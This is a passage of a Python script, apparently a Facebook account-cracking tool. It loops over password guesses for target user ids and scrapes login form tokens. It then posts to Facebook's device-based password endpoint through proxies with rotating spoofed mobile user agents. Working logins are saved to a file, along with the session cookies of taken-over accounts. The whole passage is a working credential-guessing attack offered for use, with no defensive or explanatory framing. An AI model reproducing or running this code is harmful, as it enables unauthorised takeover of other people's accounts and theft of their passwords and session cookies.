'Mozilla/5.0 (Linux; Android 6; G7200) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/23.0.119.198 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; M2012K10C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.6196.41 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; M2101K9G Build/G) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4749.13 UCBrowser/14.8.0.1675 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 7; M2010J19SY) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.2069.310 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; 2112123AC Build/K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.5013.52 UCBrowser/12.2.0.2795 Mobile Safari/537.36'
])
	ses = requests.Session()
	for pw in pwv:
		try:
			ses.headers.update({"Host":'p.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://p.facebook.com/login.php?skip_api_login=1&api_key=1443905565895688&kid_directed_site=0&app_id=1443905565895688&signed_next=1&next=https%3A%2F%2Fp.facebook.com%2Fv3.2%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D1443905565895688%26scope%3Demail%26redirect_uri%3Dhttps%253A%252F%252Fgamekit.com%252Flogin%252Ffacebook%252F%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D05ad1ddb-a2fb-4912-9e6a-456f735a3dd1%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fgamekit.com%2Flogin%2Ffacebook%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%23_%3D_&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated&_rdr').text
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":idf,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
			heade={'authority': 'm.facebook.com',
			'method': 'GET',
			'scheme': 'https',
			'referer': 'https://p.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&wtsid=rdr_0h6isQJSJIoku7Q5N&refsrc=deprecated&_rdr',
			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
			'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
			'cache-control': 'max-age=0',
			'sec-ch-prefers-color-scheme': 'light',
			'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
            'sec-ch-ua': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.70',
			'sec-ch-ua-mobile': '?1',
			'sec-ch-ua-model': '"M2007J3SG"',
			'sec-ch-ua-platform': '"Android"',
			'sec-ch-ua-platform-version': '"12.0.0"',
			'sec-fetch-dest': 'document',
			'sec-fetch-mode': 'navigate',
			'sec-fetch-site': 'none',
			'sec-fetch-user': '?1',
			'upgrade-insecure-requests': '1',
			'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
			'viewport-width': '980',
}
			po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r\033[1;31m BALEN-CP  {idf} | {pw} \n')
				open('/sdcard/ok.txt', 'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r\033[1;32m BALEN-OK  {idf} | {pw}')
				open('/sdcard/ok.txt', 'a').write(idf+'|'+pw+'\n')
				cek_apk(session,coki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

import requests,bs4,sys,os,datetime,re
from bs4 import BeautifulSoup as bs
from datetime import datetime
from itertools import count 
from requests import get 
from bs4 import BeautifulSoup 
from rich import print as cetak
from rich import print as prints
from rich.panel import Panel as nel

if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('DUMP')
	except:pass
	try:os.system('mobile .prox.txt')
	except:pass
	menu()